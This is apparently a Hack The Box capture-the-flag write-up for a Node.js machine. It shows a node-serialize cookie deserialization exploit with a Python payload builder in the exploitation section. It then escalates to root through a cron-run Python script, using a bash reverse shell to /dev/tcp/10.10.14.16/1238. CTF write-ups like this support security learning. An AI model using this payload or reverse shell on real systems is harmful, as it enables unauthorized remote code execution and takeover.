# Box 



![image-20210326161654516](img/image-20210326161654516.png)

https://www.hackthebox.eu/home/machines/profile/130

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Enumeration](#enumeration)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Enumeration

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.85 10.10.10.85
```

![image-20210326161759985](img/image-20210326161759985.png)

Let's take a look on the website : 

![image-20210326174140931](img/image-20210326174140931.png)

Nothing interesting. I started burp to see what we can do.

![image-20210326174220467](img/image-20210326174220467.png)

I searched for "X-Powered-By: Express" and found out that it is running nodeJS. 



When looking for exploits, I found some link about deserialization with the cookie .

https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf



The cookie is encoded with base64. We can see the payload : 

![image-20210326174454221](img/image-20210326174454221.png)

Let's modify the number to 4.

![image-20210326174519148](img/image-20210326174519148.png)

It seems that we are injecting something. Let's try to put a string and not a number. 

![image-20210326174602374](img/image-20210326174602374.png)

We triggered an error. It seems that it is using eval. Let's dig a bit more on the internet for some exploits. 

## Exploitation

I found this link very useful : 

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

If you follow the same steps you can also use the `nodejsshell.py` to generate our own payload. 

![image-20210326174859222](img/image-20210326174859222.png)



We need to add `_$$ND_FUNC$$_function (){our_payload()}`to create a RCE. That's what I did and this what it looks like : 

```
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"_$$ND_FUNC$$_function (){ #Insert what nodejsshell.py gave you }()"}
```

 I've done my own exploit to not be annoyed by the encoding : 

```python
from base64 import b64encode
payload = "_$$ND_FUNC$$_function (){{ {} }}()"

port_1234=#Insert what nodejsshell.py gave you
cookie='{{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{}"}}'

full_cookie = cookie.format(payload.format(port_1234))
print(full_cookie)
print(b64encode(full_cookie))

```

We have a shell :

![image-20210326182855179](img/image-20210326182855179.png)

## Post-Exploitation

### User

We are already the user.

![image-20210326183004265](img/image-20210326183004265.png)

### Root

I found in a syslog a very interesting information : 

![image-20210326185818748](img/image-20210326185818748.png)

Root is executing a python script owned by sun every 5min.



Just modify your script.py and add :

```bash
os.system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.16/1238 <&1'") 
```

Now you have to wait for 5 min....

![image-20210326185929372](img/image-20210326185929372.png)

Rooted.